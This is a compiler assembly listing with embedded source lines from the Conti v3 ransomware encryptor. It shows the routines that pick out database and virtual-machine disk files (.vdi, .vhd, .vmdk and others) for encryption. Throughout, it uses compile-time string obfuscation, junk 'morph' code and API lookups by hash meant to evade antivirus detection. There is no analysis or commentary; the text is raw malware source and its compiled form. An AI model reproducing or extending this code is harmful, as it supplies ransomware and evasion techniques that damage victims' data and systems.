	00 37		 mov	 BYTE PTR $T169[rbp-254], 55 ; 00000037H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 462  : 		OBFW(L".maw"),

  044ee	48 8d 8d 80 07
	00 00		 lea	 rcx, QWORD PTR $T169[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  044f5	c6 85 83 07 00
	00 4f		 mov	 BYTE PTR $T169[rbp-253], 79 ; 0000004fH
  044fc	c6 85 84 07 00
	00 37		 mov	 BYTE PTR $T169[rbp-252], 55 ; 00000037H
  04503	c6 85 85 07 00
	00 5f		 mov	 BYTE PTR $T169[rbp-251], 95 ; 0000005fH
  0450a	c6 85 86 07 00
	00 37		 mov	 BYTE PTR $T169[rbp-250], 55 ; 00000037H
  04511	c6 85 87 07 00
	00 6c		 mov	 BYTE PTR $T169[rbp-249], 108 ; 0000006cH
  04518	c6 85 88 07 00
	00 37		 mov	 BYTE PTR $T169[rbp-248], 55 ; 00000037H
  0451f	c6 85 89 07 00
	00 37		 mov	 BYTE PTR $T169[rbp-247], 55 ; 00000037H
  04526	c6 85 8a 07 00
	00 37		 mov	 BYTE PTR $T169[rbp-246], 55 ; 00000037H
  0452d	0f b6 85 81 07
	00 00		 movzx	 eax, BYTE PTR $T169[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 462  : 		OBFW(L".maw"),

  04534	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CJ@$0DH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<41,55,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  04539	48 89 85 70 0f
	00 00		 mov	 QWORD PTR Extensions$[rbp+1088], rax

; 463  : 		OBFW(L".mdn"),

  04540	48 8d 8d 90 07
	00 00		 lea	 rcx, QWORD PTR $T170[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  04547	c6 85 90 07 00
	00 00		 mov	 BYTE PTR $T170[rbp-256], 0
  0454e	c6 85 91 07 00
	00 47		 mov	 BYTE PTR $T170[rbp-255], 71 ; 00000047H
  04555	c6 85 92 07 00
	00 78		 mov	 BYTE PTR $T170[rbp-254], 120 ; 00000078H
  0455c	c6 85 93 07 00
	00 5f		 mov	 BYTE PTR $T170[rbp-253], 95 ; 0000005fH
  04563	c6 85 94 07 00
	00 78		 mov	 BYTE PTR $T170[rbp-252], 120 ; 00000078H
  0456a	c6 85 95 07 00
	00 13		 mov	 BYTE PTR $T170[rbp-251], 19
  04571	c6 85 96 07 00
	00 78		 mov	 BYTE PTR $T170[rbp-250], 120 ; 00000078H
  04578	c6 85 97 07 00
	00 2f		 mov	 BYTE PTR $T170[rbp-249], 47 ; 0000002fH
  0457f	c6 85 98 07 00
	00 78		 mov	 BYTE PTR $T170[rbp-248], 120 ; 00000078H
  04586	c6 85 99 07 00
	00 78		 mov	 BYTE PTR $T170[rbp-247], 120 ; 00000078H
  0458d	c6 85 9a 07 00
	00 78		 mov	 BYTE PTR $T170[rbp-246], 120 ; 00000078H
  04594	0f b6 85 91 07
	00 00		 movzx	 eax, BYTE PTR $T170[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 463  : 		OBFW(L".mdn"),

  0459b	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EP@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<79,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  045a0	48 89 85 78 0f
	00 00		 mov	 QWORD PTR Extensions$[rbp+1096], rax

; 464  : 		OBFW(L".mdt")

  045a7	48 8d 8d a0 07
	00 00		 lea	 rcx, QWORD PTR $T171[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  045ae	c6 85 a0 07 00
	00 00		 mov	 BYTE PTR $T171[rbp-256], 0
  045b5	c6 85 a1 07 00
	00 6a		 mov	 BYTE PTR $T171[rbp-255], 106 ; 0000006aH
  045bc	c6 85 a2 07 00
	00 2d		 mov	 BYTE PTR $T171[rbp-254], 45 ; 0000002dH
  045c3	c6 85 a3 07 00
	00 73		 mov	 BYTE PTR $T171[rbp-253], 115 ; 00000073H
  045ca	c6 85 a4 07 00
	00 2d		 mov	 BYTE PTR $T171[rbp-252], 45 ; 0000002dH
  045d1	c6 85 a5 07 00
	00 17		 mov	 BYTE PTR $T171[rbp-251], 23
  045d8	c6 85 a6 07 00
	00 2d		 mov	 BYTE PTR $T171[rbp-250], 45 ; 0000002dH
  045df	c6 85 a7 07 00
	00 74		 mov	 BYTE PTR $T171[rbp-249], 116 ; 00000074H
  045e6	c6 85 a8 07 00
	00 2d		 mov	 BYTE PTR $T171[rbp-248], 45 ; 0000002dH
  045ed	c6 85 a9 07 00
	00 2d		 mov	 BYTE PTR $T171[rbp-247], 45 ; 0000002dH
  045f4	c6 85 aa 07 00
	00 2d		 mov	 BYTE PTR $T171[rbp-246], 45 ; 0000002dH
  045fb	0f b6 85 a1 07
	00 00		 movzx	 eax, BYTE PTR $T171[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 464  : 		OBFW(L".mdt")

  04602	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GN@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<109,45,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  04607	48 89 85 80 0f
	00 00		 mov	 QWORD PTR Extensions$[rbp+1104], rax
  0460e	33 ff		 xor	 edi, edi
$LL4@CheckForDa:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  04610	c7 85 a8 0f 00
	00 c1 9b 17 00	 mov	 DWORD PTR _morph_var$172[rbp-256], 1547201 ; 00179bc1H

; 41   : #else
; 42   : 	volatile int _morph_var = a;
; 43   : #endif
; 44   : 
; 45   : 	//      ( ) ,  .
; 46   : 	//   ,      ,      ,
; 47   : 	//  .  ,           .
; 48   : 	if (_morph_var % 3) {

  0461a	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0461f	8b 8d a8 0f 00
	00		 mov	 ecx, DWORD PTR _morph_var$172[rbp-256]
  04625	f7 e9		 imul	 ecx
  04627	8b c2		 mov	 eax, edx
  04629	c1 e8 1f	 shr	 eax, 31
  0462c	03 d0		 add	 edx, eax
  0462e	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  04631	3b c8		 cmp	 ecx, eax
  04633	74 55		 je	 SHORT $LN20@CheckForDa

; 49   : 		_morph_var += (int)a + 2;

  04635	8b 8d a8 0f 00
	00		 mov	 ecx, DWORD PTR _morph_var$172[rbp-256]
  0463b	83 c1 02	 add	 ecx, 2
  0463e	03 cb		 add	 ecx, ebx
  04640	89 8d a8 0f 00
	00		 mov	 DWORD PTR _morph_var$172[rbp-256], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  04646	8b 85 a8 0f 00
	00		 mov	 eax, DWORD PTR _morph_var$172[rbp-256]
  0464c	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  04651	7d 07		 jge	 SHORT $LN5735@CheckForDa
  04653	ff c8		 dec	 eax
  04655	83 c8 fc	 or	 eax, -4
  04658	ff c0		 inc	 eax
$LN5735@CheckForDa:
  0465a	85 c0		 test	 eax, eax
  0465c	0f 85 87 00 00
	00		 jne	 $LN19@CheckForDa
$LL12@CheckForDa:
  04662	8b 85 a8 0f 00
	00		 mov	 eax, DWORD PTR _morph_var$172[rbp-256]
  04668	ff c0		 inc	 eax
  0466a	89 85 a8 0f 00
	00		 mov	 DWORD PTR _morph_var$172[rbp-256], eax
  04670	8b 85 a8 0f 00
	00		 mov	 eax, DWORD PTR _morph_var$172[rbp-256]
  04676	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  0467b	7d 07		 jge	 SHORT $LN5734@CheckForDa
  0467d	ff c8		 dec	 eax
  0467f	83 c8 fc	 or	 eax, -4
  04682	ff c0		 inc	 eax
$LN5734@CheckForDa:
  04684	85 c0		 test	 eax, eax
  04686	74 da		 je	 SHORT $LL12@CheckForDa

; 51   : 	}

  04688	eb 5f		 jmp	 SHORT $LN19@CheckForDa
$LN20@CheckForDa:

; 52   : 	else if (_morph_var % 2) {

  0468a	8b 85 a8 0f 00
	00		 mov	 eax, DWORD PTR _morph_var$172[rbp-256]

; 53   : 		_morph_var -= (int)a - 2;

  04690	b9 02 00 00 00	 mov	 ecx, 2
  04695	8b 85 a8 0f 00
	00		 mov	 eax, DWORD PTR _morph_var$172[rbp-256]
  0469b	2b cb		 sub	 ecx, ebx
  0469d	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0469f	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  046a4	89 8d a8 0f 00
	00		 mov	 DWORD PTR _morph_var$172[rbp-256], ecx
  046aa	8b 8d a8 0f 00
	00		 mov	 ecx, DWORD PTR _morph_var$172[rbp-256]
  046b0	f7 e9		 imul	 ecx
  046b2	8b c2		 mov	 eax, edx
  046b4	c1 e8 1f	 shr	 eax, 31
  046b7	03 d0		 add	 edx, eax
  046b9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  046bc	3b c8		 cmp	 ecx, eax
  046be	75 29		 jne	 SHORT $LN19@CheckForDa
$LL14@CheckForDa:
  046c0	8b 85 a8 0f 00
	00		 mov	 eax, DWORD PTR _morph_var$172[rbp-256]
  046c6	ff c0		 inc	 eax
  046c8	89 85 a8 0f 00
	00		 mov	 DWORD PTR _morph_var$172[rbp-256], eax
  046ce	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  046d3	8b 8d a8 0f 00
	00		 mov	 ecx, DWORD PTR _morph_var$172[rbp-256]
  046d9	f7 e9		 imul	 ecx
  046db	8b c2		 mov	 eax, edx
  046dd	c1 e8 1f	 shr	 eax, 31
  046e0	03 d0		 add	 edx, eax
  046e2	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  046e5	3b c8		 cmp	 ecx, eax
  046e7	74 d7		 je	 SHORT $LL14@CheckForDa
$LN19@CheckForDa:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1006 : 	pFunction = (PCWSTR(WINAPI*)(PCWSTR, PCWSTR))getapi::GetProcAddressEx2(NULL, SHLWAPI_MODULE_ID, 0xf8aefe61, 23);//GetProcAddress(hShlwapi, OBFA("StrStrIW"));

  046e9	ba 16 00 00 00	 mov	 edx, 22
  046ee	33 c9		 xor	 ecx, ecx
  046f0	41 b8 61 fe ae
	f8		 mov	 r8d, -122749343		; f8aefe61H
  046f6	44 8d 4a 01	 lea	 r9d, QWORD PTR [rdx+1]
  046fa	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1007 : 	return pFunction(pszFirst, pszSrch);

  046ff	48 8b 94 fd 30
	0a 00 00	 mov	 rdx, QWORD PTR Extensions$[rbp+rdi*8-256]
  04707	48 8b cb	 mov	 rcx, rbx
  0470a	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 474  : 		if (pStrStrIW(Filename, Extensions[i])) {

  0470c	48 85 c0	 test	 rax, rax
  0470f	75 12		 jne	 SHORT $LN5719@CheckForDa

; 465  : 
; 466  : 	};
; 467  : 
; 468  : 	INT Count = sizeof(Extensions) / sizeof(LPWSTR);
; 469  : 
; 470  : 	for (INT i = 0; i < Count; i++) {

  04711	48 ff c7	 inc	 rdi
  04714	48 81 ff ab 00
	00 00		 cmp	 rdi, 171		; 000000abH
  0471b	0f 8c ef fe ff
	ff		 jl	 $LL4@CheckForDa

; 476  : 		}
; 477  : 	}
; 478  : 
; 479  : 	return FALSE;

  04721	eb 05		 jmp	 SHORT $LN1@CheckForDa
$LN5719@CheckForDa:

; 475  : 			return TRUE;

  04723	b8 01 00 00 00	 mov	 eax, 1
$LN1@CheckForDa:

; 480  : }

  04728	4c 8d 9c 24 90
	10 00 00	 lea	 r11, QWORD PTR [rsp+4240]
  04730	49 8b 5b 10	 mov	 rbx, QWORD PTR [r11+16]
  04734	49 8b 7b 20	 mov	 rdi, QWORD PTR [r11+32]
  04738	49 8b e3	 mov	 rsp, r11
  0473b	5d		 pop	 rbp
  0473c	c3		 ret	 0
?CheckForDataBases@@YAHPEB_W@Z ENDP			; CheckForDataBases
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
;	COMDAT ?CheckForVirtualMachines@@YAHPEB_W@Z
_TEXT	SEGMENT
$T1 = 32
$T2 = 48
$T4 = 64
$T9 = 80
$T10 = 96
$T13 = 112
$T14 = 128
$T20 = 144
$T3 = 160
$T5 = 176
$T6 = 192
$T7 = 208
$T15 = 224
$T16 = 240
$T17 = 256
$T18 = 272
$T19 = 288
$T8 = 304
$T11 = 320
$T12 = 336
Extensions$ = 368
Filename$ = 544
_morph_var$21 = 552
?CheckForVirtualMachines@@YAHPEB_W@Z PROC		; CheckForVirtualMachines, COMDAT

; 485  : {

$LN914:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 7c 24 18	 mov	 QWORD PTR [rsp+24], rdi
  0000a	55		 push	 rbp
  0000b	48 8d ac 24 f0
	fe ff ff	 lea	 rbp, QWORD PTR [rsp-272]
  00013	48 81 ec 10 02
	00 00		 sub	 rsp, 528		; 00000210H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0001a	c6 44 24 20 00	 mov	 BYTE PTR $T1[rsp], 0

; 63   :         if (!isDecrypted())

  0001f	33 db		 xor	 ebx, ebx

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00021	c6 44 24 21 5d	 mov	 BYTE PTR $T1[rsp+1], 93	; 0000005dH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 485  : {

  00026	48 8b f9	 mov	 rdi, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00029	c6 44 24 22 7c	 mov	 BYTE PTR $T1[rsp+2], 124 ; 0000007cH
  0002e	c6 44 24 23 32	 mov	 BYTE PTR $T1[rsp+3], 50	; 00000032H
  00033	c6 44 24 24 7c	 mov	 BYTE PTR $T1[rsp+4], 124 ; 0000007cH
  00038	c6 44 24 25 1d	 mov	 BYTE PTR $T1[rsp+5], 29
  0003d	c6 44 24 26 7c	 mov	 BYTE PTR $T1[rsp+6], 124 ; 0000007cH
  00042	c6 44 24 27 38	 mov	 BYTE PTR $T1[rsp+7], 56	; 00000038H
  00047	c6 44 24 28 7c	 mov	 BYTE PTR $T1[rsp+8], 124 ; 0000007cH
  0004c	c6 44 24 29 7c	 mov	 BYTE PTR $T1[rsp+9], 124 ; 0000007cH
  00051	c6 44 24 2a 7c	 mov	 BYTE PTR $T1[rsp+10], 124 ; 0000007cH
  00056	0f b6 44 24 21	 movzx	 eax, BYTE PTR $T1[rsp+1]

; 58   :         return m_isDecrypted;

  0005b	0f b6 44 24 20	 movzx	 eax, BYTE PTR $T1[rsp]

; 63   :         if (!isDecrypted())

  00060	84 c0		 test	 al, al
  00062	75 61		 jne	 SHORT $LN740@CheckForVi

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00064	44 8b cb	 mov	 r9d, ebx
  00067	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL741@CheckForVi:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00070	42 0f b6 4c 0c
	21		 movzx	 ecx, BYTE PTR $T1[rsp+r9+1]

; 40   :     return (a % n + n) % n;

  00076	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0007b	83 e9 7c	 sub	 ecx, 124		; 0000007cH
  0007e	44 6b c1 13	 imul	 r8d, ecx, 19

; 40   :     return (a % n + n) % n;

  00082	41 f7 e8	 imul	 r8d
  00085	41 03 d0	 add	 edx, r8d
  00088	c1 fa 06	 sar	 edx, 6
  0008b	8b c2		 mov	 eax, edx
  0008d	c1 e8 1f	 shr	 eax, 31
  00090	03 d0		 add	 edx, eax
  00092	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00095	44 2b c0	 sub	 r8d, eax
  00098	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0009d	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  000a1	41 f7 e8	 imul	 r8d
  000a4	41 03 d0	 add	 edx, r8d
  000a7	c1 fa 06	 sar	 edx, 6
  000aa	8b c2		 mov	 eax, edx
  000ac	c1 e8 1f	 shr	 eax, 31
  000af	03 d0		 add	 edx, eax
  000b1	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  000b4	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  000b7	46 88 44 0c 21	 mov	 BYTE PTR $T1[rsp+r9+1], r8b
  000bc	49 ff c1	 inc	 r9
  000bf	49 83 f9 0a	 cmp	 r9, 10
  000c3	72 ab		 jb	 SHORT $LL741@CheckForVi
$LN740@CheckForVi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 489  : 		OBFW(L".vdi"),

  000c5	48 8d 44 24 21	 lea	 rax, QWORD PTR $T1[rsp+1]
  000ca	48 89 45 70	 mov	 QWORD PTR Extensions$[rbp-256], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  000ce	88 5c 24 30	 mov	 BYTE PTR $T2[rsp], bl
  000d2	c6 44 24 31 26	 mov	 BYTE PTR $T2[rsp+1], 38	; 00000026H
  000d7	c6 44 24 32 15	 mov	 BYTE PTR $T2[rsp+2], 21
  000dc	c6 44 24 33 25	 mov	 BYTE PTR $T2[rsp+3], 37	; 00000025H
  000e1	c6 44 24 34 15	 mov	 BYTE PTR $T2[rsp+4], 21
  000e6	c6 44 24 35 4c	 mov	 BYTE PTR $T2[rsp+5], 76	; 0000004cH
  000eb	c6 44 24 36 15	 mov	 BYTE PTR $T2[rsp+6], 21
  000f0	c6 44 24 37 45	 mov	 BYTE PTR $T2[rsp+7], 69	; 00000045H
  000f5	c6 44 24 38 15	 mov	 BYTE PTR $T2[rsp+8], 21
  000fa	c6 44 24 39 15	 mov	 BYTE PTR $T2[rsp+9], 21
  000ff	c6 44 24 3a 15	 mov	 BYTE PTR $T2[rsp+10], 21
  00104	0f b6 44 24 31	 movzx	 eax, BYTE PTR $T2[rsp+1]

; 58   :         return m_isDecrypted;

  00109	0f b6 44 24 30	 movzx	 eax, BYTE PTR $T2[rsp]

; 63   :         if (!isDecrypted())

  0010e	84 c0		 test	 al, al
  00110	75 63		 jne	 SHORT $LN56@CheckForVi

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00112	4c 8b cb	 mov	 r9, rbx
  00115	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL57@CheckForVi:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00120	42 0f b6 4c 0c
	31		 movzx	 ecx, BYTE PTR $T2[rsp+r9+1]

; 40   :     return (a % n + n) % n;

  00126	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0012b	83 e9 15	 sub	 ecx, 21
  0012e	44 6b c1 37	 imul	 r8d, ecx, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  00132	41 f7 e8	 imul	 r8d
  00135	41 03 d0	 add	 edx, r8d
  00138	c1 fa 06	 sar	 edx, 6
  0013b	8b c2		 mov	 eax, edx
  0013d	c1 e8 1f	 shr	 eax, 31
  00140	03 d0		 add	 edx, eax
  00142	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00145	44 2b c0	 sub	 r8d, eax
  00148	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0014d	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00151	41 f7 e8	 imul	 r8d
  00154	41 03 d0	 add	 edx, r8d
  00157	c1 fa 06	 sar	 edx, 6
  0015a	8b c2		 mov	 eax, edx
  0015c	c1 e8 1f	 shr	 eax, 31
  0015f	03 d0		 add	 edx, eax
  00161	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00164	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00167	46 88 44 0c 31	 mov	 BYTE PTR $T2[rsp+r9+1], r8b
  0016c	49 ff c1	 inc	 r9
  0016f	49 83 f9 0a	 cmp	 r9, 10
  00173	72 ab		 jb	 SHORT $LL57@CheckForVi
$LN56@CheckForVi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 490  : 		OBFW(L".vhd"),

  00175	48 8d 44 24 31	 lea	 rax, QWORD PTR $T2[rsp+1]
  0017a	48 89 45 78	 mov	 QWORD PTR Extensions$[rbp-248], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0017e	88 5d a0	 mov	 BYTE PTR $T3[rbp-256], bl
  00181	c6 45 a1 67	 mov	 BYTE PTR $T3[rbp-255], 103 ; 00000067H
  00185	c6 45 a2 1e	 mov	 BYTE PTR $T3[rbp-254], 30
  00189	c6 45 a3 18	 mov	 BYTE PTR $T3[rbp-253], 24
  0018d	c6 45 a4 1e	 mov	 BYTE PTR $T3[rbp-252], 30
  00191	c6 45 a5 12	 mov	 BYTE PTR $T3[rbp-251], 18
  00195	c6 45 a6 1e	 mov	 BYTE PTR $T3[rbp-250], 30
  00199	c6 45 a7 0c	 mov	 BYTE PTR $T3[rbp-249], 12
  0019d	c6 45 a8 1e	 mov	 BYTE PTR $T3[rbp-248], 30
  001a1	c6 45 a9 3b	 mov	 BYTE PTR $T3[rbp-247], 59 ; 0000003bH
  001a5	c6 45 aa 1e	 mov	 BYTE PTR $T3[rbp-246], 30
  001a9	c6 45 ab 1e	 mov	 BYTE PTR $T3[rbp-245], 30
  001ad	c6 45 ac 1e	 mov	 BYTE PTR $T3[rbp-244], 30
  001b1	0f b6 45 a1	 movzx	 eax, BYTE PTR $T3[rbp-255]

; 58   :         return m_isDecrypted;

  001b5	0f b6 45 a0	 movzx	 eax, BYTE PTR $T3[rbp-256]

; 63   :         if (!isDecrypted())

  001b9	84 c0		 test	 al, al
  001bb	75 54		 jne	 SHORT $LN94@CheckForVi

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  001bd	4c 8b c3	 mov	 r8, rbx
$LL95@CheckForVi:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  001c0	42 0f b6 4c 05
	a1		 movzx	 ecx, BYTE PTR $T3[rbp+r8-255]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  001c6	b8 1e 00 00 00	 mov	 eax, 30
  001cb	2b c1		 sub	 eax, ecx
  001cd	6b c8 3e	 imul	 ecx, eax, 62		; 0000003eH

; 40   :     return (a % n + n) % n;

  001d0	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  001d5	f7 e9		 imul	 ecx
  001d7	03 d1		 add	 edx, ecx
  001d9	c1 fa 06	 sar	 edx, 6
  001dc	8b c2		 mov	 eax, edx
  001de	c1 e8 1f	 shr	 eax, 31
  001e1	03 d0		 add	 edx, eax
  001e3	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  001e6	2b c8		 sub	 ecx, eax
  001e8	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  001ed	83 c1 7f	 add	 ecx, 127		; 0000007fH
  001f0	f7 e9		 imul	 ecx
  001f2	03 d1		 add	 edx, ecx
  001f4	c1 fa 06	 sar	 edx, 6
  001f7	8b c2		 mov	 eax, edx
  001f9	c1 e8 1f	 shr	 eax, 31
  001fc	03 d0		 add	 edx, eax
  001fe	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00201	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00203	42 88 4c 05 a1	 mov	 BYTE PTR $T3[rbp+r8-255], cl
  00208	49 ff c0	 inc	 r8
  0020b	49 83 f8 0c	 cmp	 r8, 12
  0020f	72 af		 jb	 SHORT $LL95@CheckForVi
$LN94@CheckForVi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 491  : 		OBFW(L".vmdk"),

  00211	48 8d 45 a1	 lea	 rax, QWORD PTR $T3[rbp-255]
  00215	48 89 85 80 00
	00 00		 mov	 QWORD PTR Extensions$[rbp-240], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0021c	88 5c 24 40	 mov	 BYTE PTR $T4[rsp], bl
  00220	c6 44 24 41 20	 mov	 BYTE PTR $T4[rsp+1], 32	; 00000020H
  00225	c6 44 24 42 43	 mov	 BYTE PTR $T4[rsp+2], 67	; 00000043H
